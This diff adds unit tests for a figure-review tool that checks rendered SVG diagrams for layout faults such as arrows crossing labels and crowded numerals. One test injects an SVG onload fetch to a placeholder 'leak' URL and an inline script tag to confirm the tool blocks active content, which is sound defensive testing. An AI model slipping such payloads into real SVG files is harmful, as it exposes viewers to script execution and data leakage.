@@ -73,6 +73,109 @@ test("reviewFigure: crowding, margin, and small-text findings include actionable
   assert.ok(review.measurement_summary.visual > 0);
 });
 
+test("reviewFigure: connector lines crossing text are fix-before-filing findings", () => {
+  const bad = {
+    ...CLEAN,
+    fig: "FIG09",
+    arrows: [{ from: "10", to: "12", kind: "flow", label: "crossing", labelX: 345, labelY: 170 }],
+  };
+  const review = reviewFigure(bad, renderFigure(bad));
+  const finding = review.findings.find((f) => f.code === "ARROW_TEXT_COLLISION");
+  assert.ok(finding, JSON.stringify(review.findings, null, 2));
+  assert.equal(finding.severity, "fix-before-filing");
+  assertStructuredFinding(finding);
+  assert.ok(Array.isArray(finding.bbox));
+  assert.ok(finding.collisions.some((c) => c.text === "crossing"));
+});
+
+test("reviewFigure: labels squeezed against part borders are fix-before-filing findings", () => {
+  const bad = {
+    fig: "FIG11",
+    width: 520,
+    height: 380,
+    styleScale: 1.5,
+    parts: [
+      { numeral: "10", label: "orientation channel", shape: "box", x: 150, y: 110, w: 145, h: 84 },
+      { numeral: "12", label: "output", shape: "box", x: 340, y: 110, w: 120, h: 84 },
+    ],
+    arrows: [{ from: "10", to: "12", kind: "flow" }],
+  };
+  const review = reviewFigure(bad, renderFigure(bad));
+  const finding = review.findings.find((f) => f.code === "LABEL_BORDER_CROWDING");
+  assert.ok(finding, JSON.stringify(review.findings, null, 2));
+  assert.equal(finding.severity, "fix-before-filing");
+  assertStructuredFinding(finding);
+  assert.ok(finding.collisions.some((c) => c.numeral === "10"));
+});
+
+test("reviewFigure: ellipse labels are checked against the curved boundary", () => {
+  const bad = {
+    fig: "FIG12",
+    width: 520,
+    height: 380,
+    styleScale: 1.4,
+    parts: [
+      { numeral: "10", label: "orientation channel", shape: "ellipse", x: 120, y: 100, w: 150, h: 82 },
+      { numeral: "12", label: "output", shape: "box", x: 350, y: 100, w: 110, h: 82 },
+    ],
+    arrows: [{ from: "10", to: "12", kind: "flow" }],
+  };
+  const review = reviewFigure(bad, renderFigure(bad));
+  const finding = review.findings.find((item) => item.code === "LABEL_BORDER_CROWDING");
+  assert.ok(finding, JSON.stringify(review.findings, null, 2));
+  assert.ok(finding.collisions.some((item) => item.numeral === "10" && item.shape === "ellipse"));
+});
+
+test("reviewFigure: connector crossing an unrelated feature is fix-before-filing", () => {
+  const bad = {
+    fig: "FIG13",
+    width: 780,
+    height: 420,
+    parts: [
+      { numeral: "10", label: "source", shape: "box", x: 70, y: 140, w: 140, h: 90 },
+      { numeral: "12", label: "unrelated", shape: "box", x: 320, y: 130, w: 140, h: 110 },
+      { numeral: "14", label: "target", shape: "box", x: 570, y: 140, w: 140, h: 90 },
+    ],
+    arrows: [{ from: "10", to: "14", kind: "flow" }],
+  };
+  const review = reviewFigure(bad, renderFigure(bad));
+  const finding = review.findings.find((item) => item.code === "ARROW_PART_COLLISION");
+  assert.ok(finding, JSON.stringify(review.findings, null, 2));
+  assert.ok(finding.collisions.some((item) => item.crosses === "12"));
+});
+
+test("reviewFigure: reference numerals overlapping sibling features are fix-before-filing findings", () => {
+  const bad = {
+    fig: "FIG10",
+    width: 700,
+    height: 520,
+    parts: [
+      { numeral: "10", label: "first part", shape: "box", x: 110, y: 140, w: 180, h: 90 },
+      { numeral: "12", label: "second part", shape: "box", x: 420, y: 140, w: 180, h: 90, numX: 185, numY: 185 },
+    ],
+    arrows: [],
+  };
+  const review = reviewFigure(bad, renderFigure(bad));
+  const finding = review.findings.find((f) => f.code === "NUMERAL_PART_COLLISION");
+  assert.ok(finding, JSON.stringify(review.findings, null, 2));
+  assert.equal(finding.severity, "fix-before-filing");
+  assertStructuredFinding(finding);
+  assert.ok(finding.collisions.some((c) => c.numeral === "12" && c.overlaps === "10"));
+});
+
+test("reviewFigure blocks active SVG even when expected figure content remains present", () => {
+  const rendered = renderFigure(CLEAN).replace(
+    "<svg ",
+    '<svg onload="fetch(\'https://example.test/leak\')" ',
+  ).replace("</svg>", "<script>alert(1)</script></svg>");
+  const review = reviewFigure(CLEAN, rendered);
+  const finding = review.findings.find((item) => item.code === "SVG_UNSAFE_ACTIVE_CONTENT");
+  assert.ok(finding, JSON.stringify(review.findings, null, 2));
+  assert.equal(finding.severity, "blocking");
+  assert.ok(finding.issues.some((item) => item.code === "SVG_ACTIVE_TAG"));
+  assert.ok(finding.issues.some((item) => item.code === "SVG_EVENT_ATTRIBUTE"));
+});
+
 test("missingSvgReview uses the same structured finding shape", () => {
   const review = missingSvgReview("FIG77", "missing.svg");
   assert.equal(review.blocking, 1);
